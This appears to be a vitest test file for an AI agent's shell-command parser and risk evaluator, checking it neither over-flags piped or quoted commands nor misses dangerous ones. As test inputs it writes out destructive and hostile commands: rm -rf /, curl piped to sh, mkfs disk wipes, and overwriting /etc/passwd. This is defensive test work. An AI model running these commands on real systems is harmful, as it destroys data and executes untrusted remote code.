/**
 * Shell Parser tree-sitter 引擎测试
 *
 * 核心目标：验证新解析引擎不误判（2026-10 管道/拼接命令假 critical 事故的回归）
 * 且不漏判（命令替换、孤立重定向、Windows 内联形态）。
 */

import { describe, it, expect, beforeAll } from 'vitest';
import {
  parseShellCommand,
  parseShellCommandFallback,
  getCommandNames,
  getRedirectTargets,
  initShellParser,
  isShellParserReady,
  getShellParserEngine,
} from '@octopi-agent/engine/harness/governance/security/shell-parser.js';
import { evaluateShellCommand, detectDownloadToInterpreter, detectDiskWipe } from '@octopi-agent/engine/harness/governance/security/risk-evaluator.js';
import { DefaultToolCallRiskPolicy } from '@octopi-agent/engine/harness/governance/security/default-risk-policy.js';
import type { ToolCall } from '@octopi-agent/core/types.js';

const cwd = '/Users/admin/.octopi/workspace/default';

beforeAll(async () => {
  await initShellParser();
  // 引擎必须就绪：vendored wasm 是构建产物的一部分，缺失=交付缺陷，不允许静默降级
  expect(isShellParserReady()).toBe(true);
});

// ═══════════════════════════════════════════════════
// 回归：2026-10 管道/拼接命令被误判 critical 的四类真实样本
// ═══════════════════════════════════════════════════

describe('Regression: 管道与拼接命令不误判', () => {
  it('引擎选择：初始化后走 tree-sitter', () => {
    expect(getShellParserEngine()).toBe('treesitter');
  });

  it('样本1 ssh+sudo+引号内 2>/dev/null+管道 → 不拦截', () => {
    const command = `cd /Users/admin/.octopi/workspace/default
export DISPLAY=:0 SSH_ASKPASS=$PWD/.askpass.sh SSH_ASKPASS_REQUIRE=force
SSH="ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no octopi@192.168.3.189"
$SSH "sudo -S -p '' sh -c 'du -xhd1 / 2>/dev/null | sort -h | tail -14; echo ---; ls -lh /swapfile; echo ---; cat /etc/fnos-release 2>/dev/null; cat /etc/trim_version 2>/dev/null; echo ---; which growpart resize2fs parted; echo ---; du -sh /var/lib/docker /var/log /var/cache/apt /root /opt 2>/dev/null'" < .pw 2>&1 | grep -v "Could not chdir"`;
    const parsed = parseShellCommand(command);
    expect(parsed.uncertain).toBeUndefined();
    // 赋值/声明不是命令；真实命令只有 cd / $SSH / grep
    expect(getCommandNames(parsed)).toEqual(['cd', '$SSH', 'grep']);
    // 引号内文本绝不产生重定向目标；目标不允许出现空白垃圾串
    expect(getRedirectTargets(parsed).every((t) => !/\s/.test(t))).toBe(true);
    const risk = evaluateShellCommand(command, cwd);
    expect(risk.level).toBe('unknown');
    expect(risk.reason).not.toContain('(protected)');
    expect(risk.reason).not.toContain('目标路径');
  });

  it('样本2 for 循环 + 嵌套引号 + $(wc -l < $f) → 不拦截', () => {
    const command = `cd /Users/admin/.octopi/workspace/default
for f in *.log; do echo "$f: $(grep -c marker "$f" 2>/dev/null) markers, $(wc -l < $f) lines"; done > /dev/null`;
    const parsed = parseShellCommand(command);
    expect(parsed.uncertain).toBeUndefined();
    expect(getRedirectTargets(parsed).every((t) => !/\s/.test(t))).toBe(true);
    const risk = evaluateShellCommand(command, cwd);
    expect(risk.level).toBe('medium');
    expect(risk.reason).not.toContain('(protected)');
    expect(risk.reason).not.toContain('目标路径');
  });

  it('样本3 bash 脚本参数内含 2>/dev/null 与管道 → low', () => {
    const command = `bash /Users/admin/.octopi/workspace/default/fnos_run.sh "echo ===SYS===; hostname; uptime; echo ===FNVERSION===; cat /etc/fnos/version 2>/dev/null; cat /etc/*release* 2>/dev/null | grep -i -E 'trim|fnos|PRETTY'; echo ===VERCMD===; ls /usr/trim/bin/ 2>/dev/null | head -20"`;
    const risk = evaluateShellCommand(command, cwd);
    expect(risk.level).toBe('low');
    expect(risk.reason).not.toContain('(protected)');
    expect(risk.reason).not.toContain('目标路径');
  });

  it('样本4 bash 脚本参数内含 2>/dev/null 与 ss|grep → low', () => {
    const command = `bash /Users/admin/.octopi/workspace/default/fnos_run.sh "cat /usr/trim/etc/version; echo ---; systemctl is-active nginx.service; systemctl is-active fnos-web.service 2>/dev/null; ss -lntp 2>/dev/null | grep -E '5666|5667'"`;
    const risk = evaluateShellCommand(command, cwd);
    expect(risk.level).toBe('low');
    expect(risk.reason).not.toContain('(protected)');
    expect(risk.reason).not.toContain('目标路径');
  });

  it('引号内的 2>/dev/null | wc -l 是字面量 → low', () => {
    const risk = evaluateShellCommand('echo "2>/dev/null | wc -l" > /tmp/out.txt', cwd);
    expect(risk.level).toBe('low');
    expect(getRedirectTargets(parseShellCommand('echo "2>/dev/null | wc -l" > /tmp/out.txt')))
      .toEqual(['/tmp/out.txt']);
  });

  it('单引号里的 $(rm -rf /) 是字面量，不报子 shell', () => {
    const parsed = parseShellCommand("echo '$(rm -rf /)'");
    expect(parsed.hasSubshell).toBe(false);
  });
});

// ═══════════════════════════════════════════════════
// 不漏判：真实执行的结构必须计入
// ═══════════════════════════════════════════════════

describe('不漏判：真实执行结构', () => {
  it('命令替换里的 rm -rf / 会真实执行 → critical', () => {
    const risk = evaluateShellCommand('echo $(rm -rf /)', cwd);
    expect(risk.level).toBe('critical');
  });

  it('for 循环整体重定向到保护路径 → critical', () => {
    const risk = evaluateShellCommand('for f in *; do echo x; done > /etc/evil', cwd);
    expect(risk.level).toBe('critical');
    expect(risk.reason).toContain('/etc/evil');
  });

  it('孤立重定向（无命令）到保护路径 → critical', () => {
    const parsed = parseShellCommand('> /etc/passwd');
    expect(parsed.orphanRedirects).toHaveLength(1);
    expect(getRedirectTargets(parsed)).toEqual(['/etc/passwd']);
    const risk = evaluateShellCommand('> /etc/passwd', cwd);
    expect(risk.level).toBe('critical');
  });

  it('heredoc 正文是数据：字面命令文本不执行 → low', () => {
    const risk = evaluateShellCommand('cat <<EOF\nrm -rf /\nEOF\n', cwd);
    expect(risk.level).toBe('low');
  });

  it('windows powershell 内联 Remove-Item 保护路径 → high/critical', () => {
    const risk = evaluateShellCommand(
      'powershell -Command "Remove-Item -Recurse C:\\Windows"',
      cwd,
    );
    expect(['high', 'critical']).toContain(risk.level);
  });
});

// ═══════════════════════════════════════════════════
// 映射语义：声明/赋值/关键字
// ═══════════════════════════════════════════════════

describe('映射语义', () => {
  it('VAR=1 cmd：赋值不是命令，cmd 才是', () => {
    const parsed = parseShellCommand('VAR=1 some_cmd arg');
    expect(getCommandNames(parsed)).toEqual(['some_cmd']);
    expect(parsed.segments[0].args).toEqual(['arg']);
  });

  it('export/declare 是声明，不产生命令段', () => {
    expect(parseShellCommand('export DISPLAY=:0 FOO=bar').segments).toHaveLength(0);
  });

  it('for/do/done 关键字不是命令', () => {
    const parsed = parseShellCommand('for f in *.log; do echo "$f"; done');
    expect(getCommandNames(parsed)).toEqual(['echo']);
  });

  it('[[ ]] 测试表达式不是命令', () => {
    const parsed = parseShellCommand('[[ -f /etc/passwd ]] && ls');
    expect(getCommandNames(parsed)).toEqual(['ls']);
  });

  it('sudo -u root npm install → 命令是 npm', () => {
    const parsed = parseShellCommand('sudo -u root npm install');
    expect(parsed.segments[0].command).toBe('npm');
    expect(parsed.segments[0].isSudo).toBe(true);
    expect(parsed.segments[0].wrappers).toContain('sudo');
  });

  it('解析确定性：同输入同输出', () => {
    const command = 'rm -rf ./dist 2>&1 | tee /tmp/log';
    expect(parseShellCommand(command)).toEqual(parseShellCommand(command));
  });
});

// ═══════════════════════════════════════════════════
// 不确定输入：显式走 unknown，不静默
// ═══════════════════════════════════════════════════

describe('不确定输入', () => {
  it('语法错误输入 → uncertain 标记 + unknown 等级', () => {
    const parsed = parseShellCommand('echo "unclosed');
    expect(parsed.uncertain).toBe(true);
    const risk = evaluateShellCommand('echo "unclosed', cwd);
    expect(risk.level).toBe('unknown');
    expect(risk.reason).toContain('结构不确定');
  });
});

// ═══════════════════════════════════════════════════
// fallback 回退引擎：解析不完整可以，解析错误不行
// ═══════════════════════════════════════════════════

describe('fallback 回退引擎守卫', () => {
  it('引号内 2>/dev/null 不再捏造重定向目标（假 critical 根因）', () => {
    const parsed = parseShellCommandFallback(
      'bash x.sh "cat /etc/fnos-release 2>/dev/null; ls /usr/trim/bin/ 2>/dev/null | head"',
    );
    expect(getRedirectTargets(parsed)).toEqual([]);
  });

  it('正常粘连重定向仍识别', () => {
    const parsed = parseShellCommandFallback('echo hello>/tmp/out.txt');
    expect(getRedirectTargets(parsed)).toEqual(['/tmp/out.txt']);
  });

  it('F5 引号里的 a>/etc/passwd 是字面量，fallback 也不误判', () => {
    const parsed = parseShellCommandFallback("grep -r 'a>/etc/passwd' .");
    expect(getRedirectTargets(parsed)).toEqual([]);
  });

  it('F4 fallback 保留含变量的重定向目标（>/etc/$FILE）', () => {
    const parsed = parseShellCommandFallback('echo x >/etc/$FILE');
    expect(getRedirectTargets(parsed)).toEqual(['/etc/$FILE']);
  });
});

// ═══════════════════════════════════════════════════
// 评审回归：补齐盲区（独立评审 F2/F3/F7/F11）
// ═══════════════════════════════════════════════════

describe('评审回归：真实执行盲区补齐', () => {
  it('F2 未引号 heredoc 里的 $(rm -rf /) 真实执行 → critical', () => {
    const risk = evaluateShellCommand('cat <<EOF\n$(rm -rf /)\nEOF\n', cwd);
    expect(risk.level).toBe('critical');
  });

  it('F2 引号 heredoc（<<\'EOF\'）里的 $(...) 是字面量 → low', () => {
    const risk = evaluateShellCommand("cat <<'EOF'\n$(rm -rf /)\nEOF\n", cwd);
    expect(risk.level).toBe('low');
  });

  it('F3 $\'...\' ANSI-C 引号里的保护路径删除 → critical', () => {
    const risk = evaluateShellCommand("rm -rf $'/etc'", cwd);
    expect(risk.level).toBe('critical');
  });

  it('F3 $\'...\' 保留 Windows 路径反斜杠', () => {
    const parsed = parseShellCommand("rm -rf $'C:\\Windows'");
    expect(parsed.segments[0].args).toContain('C:\\Windows');
  });

  it('F7 管道末级解释器带整句重定向仍识别 → high', () => {
    const parsed = parseShellCommand('curl http://x | bash > /tmp/log');
    expect(parsed.hasShellPipe).toBe(true);
    const risk = evaluateShellCommand('curl http://x | bash > /tmp/log', cwd);
    expect(risk.level).toBe('high');
  });

  it('F11 硬边界：下载并执行直接命中', () => {
    expect(detectDownloadToInterpreter('curl http://x | sh')).not.toBeNull();
    expect(detectDownloadToInterpreter('cat file.txt | grep x')).toBeNull();
  });

  it('F11 硬边界：清盘命令位判定', () => {
    expect(detectDiskWipe('mkfs.ext4 /dev/sda')).not.toBeNull();
    expect(detectDiskWipe('echo format C:')).toBeNull();
  });
});

// ═══════════════════════════════════════════════════
// F6：强不确定与等级正交（拦截行为不变，正交通知安全智能体）
// ═══════════════════════════════════════════════════

describe('F6 强不确定与等级正交', () => {
  it('结构不确定 → decision.uncertain 标记', () => {
    const risk = evaluateShellCommand('echo "unclosed', cwd);
    expect(risk.level).toBe('unknown');
    expect(risk.uncertain).toBe(true);
  });

  it('正常命令不带 uncertain', () => {
    const risk = evaluateShellCommand('ls -la', cwd);
    expect(risk.level).toBe('low');
    expect(risk.uncertain).toBeUndefined();
  });

  it('弱不确定（未知命令名）不带 uncertain——不刷屏安全智能体', () => {
    const risk = evaluateShellCommand('some_random_tool --do-something', cwd);
    expect(risk.level).toBe('unknown');
    expect(risk.uncertain).toBeUndefined();
  });

  it('uncertain 与高风险并存：照常 critical 拦截，同时标记 uncertain', () => {
    const risk = evaluateShellCommand('rm -rf / && echo "unclosed', cwd);
    expect(risk.level).toBe('critical');
    expect(risk.uncertain).toBe(true);
  });

  it('RiskPolicy.assess 透传 uncertain（守卫消费面）', () => {
    const policy = new DefaultToolCallRiskPolicy({ cwd });
    const decision = policy.assess({
      id: '1',
      name: 'shell',
      arguments: { command: 'echo "unclosed' },
    } as ToolCall);
    expect(decision.level).toBe('unknown');
    expect(decision.uncertain).toBe(true);
  });
});
